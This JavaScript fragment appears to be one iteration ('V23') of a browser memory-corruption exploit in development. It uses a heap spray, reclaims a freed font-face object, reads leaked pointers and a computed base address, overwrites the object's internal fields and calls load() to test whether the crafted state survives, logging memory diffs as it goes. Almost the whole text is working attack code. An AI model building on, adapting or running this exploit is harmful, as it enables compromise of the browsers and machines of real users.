// V23 Patch: Original Clients Test
// V22 crashed even with original Timer - test with ORIGINAL clients (not null)

/* ==== V23: ORIGINAL CLIENTS TEST ====
 *
 * V22 FINDING: Original Timer also crashes. Timer is NOT the cause.
 *
 * HYPOTHESIS: The crash is caused by NULL CLIENT TABLE, not by Timer.
 * Test with ORIGINAL client table from reclaimed face.
 *
 * APPROACH:
 * 1. Use ORIGINAL client table from reclaimed face (not null)
 * 2. Use ORIGINAL Timer from reclaimed face (from V22)
 * 3. Keep all other V18C crafting (empty sources, Pending status)
 * 4. Call load() and see if it crashes
 *
 * EXPECTED:
 * - If it works: Null client table was the cause. Use original clients.
 * - If it crashes: Something more fundamental (fork divergence or object identity).
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V23-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== VALIDATE ORIGINAL STATE ==== */
      bs('V23-VALIDATE-ORIGINAL');

      /* Read original Timer state */
      var timerH=readAt(S+0x88n,0x38);
      bs('V23-ORIGINAL-TIMER='+timerH);

      /* Read original client table pointer */
      var origClients=0n;
      for(var cb=0;cb<8;cb++)origClients|=BigInt(hitBuf[0x58+cb])<<BigInt(cb*8);
      bs('V23-ORIGINAL-CLIENTS='+hex(origClients));

      /* Verify it matches L1 */
      if(origClients===L1){
        bs('V23-CLIENTS-MATCH-L1');
      }else{
        bs('V23-CLIENTS-MISMATCH-expect='+hex(L1));
      }

      /* ==== CRAFT FACE (ORIGINAL CLIENTS + ORIGINAL TIMER) ==== */
      bs('V23-CRAFT-START');

      /* Status = Pending (0) */
      hitBuf[0x82]=0;
      bs('V23-FIELD-status=Pending');

      /* Override = Block (1) */
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      bs('V23-FIELD-override=Block');

      /* Empty sources */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;
      bs('V23-FIELD-sources=empty');

      /* CLIENTS: DO NOT MODIFY - keep original from reclaim */
      bs('V23-FIELD-clients=ORIGINAL-no-modification');

      /* Hash table header: keep original */
      bs('V23-FIELD-htobj=ORIGINAL');

      /* Promise null */
      for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;
      bs('V23-FIELD-promise=null');

      /* sourcesPopulated=1 */
      hitBuf[0x83]=1;
      bs('V23-FIELD-sourcesPopulated=1');

      /* TIMER: DO NOT MODIFY - keep original from reclaim */
      bs('V23-FIELD-timer=ORIGINAL-no-modification');

      bs('V23-CRAFT-COMPLETE');

      /* ==== VERIFY FINAL STATE ==== */
      bs('V23-VERIFY-FINAL');
      bs('V23-VERIFY-status='+hitBuf[0x82]);
      bs('V23-VERIFY-sources='+hitBuf.slice(0x28,0x38).map(x=>x.toString(16)).join(','));
      bs('V23-VERIFY-clients='+hitBuf.slice(0x58,0x60).map(x=>x.toString(16)).join(','));
      bs('V23-VERIFY-override='+hitBuf[0x87]);

      /* Verify clients are still original */
      var clientsAfter=0n;
      for(var cb=0;cb<8;cb++)clientsAfter|=BigInt(hitBuf[0x58+cb])<<BigInt(cb*8);
      if(clientsAfter===origClients){
        bs('V23-VERIFY-clients=UNCHANGED');
      }else{
        bs('V23-VERIFY-clients=CHANGED-unexpected');
      }

      /* ==== CALL LOAD ==== */
      bs('V23-LOAD-PRE');
      var loadReturned=false;
      var loadThrew=false;
      var loadError='';

      try{
        faces[zi].load();
        loadReturned=true;
        bs('V23-LOAD-RETURNED');
      }catch(e){
        loadThrew=true;
        loadError=String(e&&e.message?e.message:'?');
        bs('V23-LOAD-THREW-'+loadError);
      }

      /* ==== POST-LOAD ANALYSIS ==== */
      bs('V23-POST-LOAD-returned='+loadReturned+'-threw='+loadThrew);

      /* Final status read */
      var finalStatus=hitBuf[0x82];
      bs('V23-STATUS-AFTER='+finalStatus);

      /* Check JS binding status */
      try{
        var jsStatus=faces[zi].status;
        bs('V23-JS-STATUS='+jsStatus);
      }catch(e){
        bs('V23-JS-STATUS-ERROR-'+String(e&&e.message?e.message:'?'));
      }

      /* ==== WITNESS CHECK ==== */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('V23-WIT-WRITE-'+diffs.slice(0,8).join('|'));
      else bs('V23-WIT-nowrite');

      /* Restore original table pointer (already original, but for consistency) */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V23-RESTORED');

      /* Verdict */
      if(loadReturned){
        verd('ok','V23 Original Clients load() SUCCESS');
        bs('V23-DONE-SUCCESS-null-clients-was-the-cause');
      }else{
        verd('err','V23 Original Clients load() FAILED');
        bs('V23-DONE-FAILED-fundamental-issue');
      }

    }else bs('V23-SKIP-bad-idx');
  }else bs('V23-SKIP-missing-data');
}catch(e23){bs('V23-ERR-'+String(e23&&e23.message?e23.message:'?'));}
/* ==== V23 END ==== */
